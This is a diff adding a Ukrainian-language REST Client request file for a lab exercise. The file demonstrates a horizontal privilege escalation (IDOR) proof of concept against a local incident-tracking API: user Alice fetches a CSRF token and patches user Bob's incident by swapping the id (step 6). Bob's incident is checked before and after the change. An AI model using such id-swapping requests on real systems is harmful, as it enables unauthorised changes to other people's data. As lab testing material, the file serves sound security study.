@@ -1,0 +1,51 @@
+# ЛР 4: сценарій PoC горизонтальної зміни (Alice -> інцидент Bob).
+# Пароль береться зі змінної середовища SeedUsers__Password, cookie тримає REST Client.
+# Змінювальні запити несуть CSRF-токен з GET /api/auth/csrf (захист з ЛР 3).
+@host = http://localhost:5080
+@aliceIncident = 20000000-0000-0000-0000-000000000001
+@bobIncident = 20000000-0000-0000-0000-000000000002
+
+### 1. Bob входить, щоб зафіксувати стан свого інциденту ДО спроби Alice
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{ "userName": "bob", "password": "{{$processEnv SeedUsers__Password}}" }
+
+### 2. Стан інциденту Bob до запиту
+GET {{host}}/api/incidents/{{bobIncident}}
+Accept: application/json
+
+### 3. Alice входить (той самий REST Client замінює cookie)
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{ "userName": "alice", "password": "{{$processEnv SeedUsers__Password}}" }
+
+### 4. CSRF-токен для сеансу Alice
+# @name aliceCsrf
+GET {{host}}/api/auth/csrf
+Accept: application/json
+
+### 5. Alice змінює ВЛАСНИЙ інцидент: очікувано 200
+PATCH {{host}}/api/incidents/{{aliceIncident}}
+Content-Type: application/json
+X-CSRF-TOKEN: {{aliceCsrf.response.body.$.token}}
+
+{ "description": "Лист переслано на адресу служби підтримки, вкладення не відкривалося." }
+
+### 6. PoC: той самий запит, змінено лише id на інцидент Bob
+PATCH {{host}}/api/incidents/{{bobIncident}}
+Content-Type: application/json
+X-CSRF-TOKEN: {{aliceCsrf.response.body.$.token}}
+
+{ "title": "Заголовок змінено з облікового запису Alice" }
+
+### 7. Bob знову входить і читає свій інцидент ПІСЛЯ запиту Alice
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{ "userName": "bob", "password": "{{$processEnv SeedUsers__Password}}" }
+
+###
+GET {{host}}/api/incidents/{{bobIncident}}
+Accept: application/json
